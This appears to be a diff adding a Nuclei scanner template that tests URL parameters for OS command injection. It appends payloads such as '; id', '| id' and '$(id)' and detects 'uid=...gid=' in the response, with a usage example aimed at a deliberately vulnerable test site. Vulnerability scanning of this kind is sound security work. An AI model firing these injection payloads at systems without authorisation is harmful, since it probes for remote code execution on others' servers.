@@ -1,0 +1,32 @@
+id: RCE
+
+#USUAGE     $ echo "http://testphp.vulnweb.com/listproducts.php?cat=" | nuclei -t rce.yaml | awk '{print $6}'
+#Single parameter URLs only
+
+info:
+  name: RCE
+  author: 25
+  severity: high
+  tags: rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{payload}}"
+
+    payloads:
+       payload: 
+        - 'id'
+        - '| id'
+        - '; id'
+        - '& id'
+        - '|| id'
+        - '&& id'
+        - '$(id)'
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        regex:
+          - 'uid=[0-9a-zA-Z_()-. ]+gid=[0-9a-zA-Z_()-. ]+'
+        part: body
